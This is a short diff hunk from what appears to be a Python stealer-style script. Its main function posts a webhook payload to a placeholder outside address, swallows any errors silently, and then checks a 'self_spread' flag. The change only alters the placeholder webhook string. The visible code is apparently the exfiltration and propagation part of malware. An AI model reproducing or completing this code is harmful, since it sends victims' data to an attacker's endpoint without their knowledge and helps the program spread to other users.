@@ -181,7 +181,7 @@ def main():
         "avatar_url": "https://lh3.googleusercontent.com/a-/AOh14GiNgs67eI-_60_GJbJ37yxqOJXIbs3Nh4crgMXC=s600-k-no-rp-mo"
     }
     try:
-        urlopen(Request("Enter Webhook Here", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("Enter Webhook Herekhjg", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
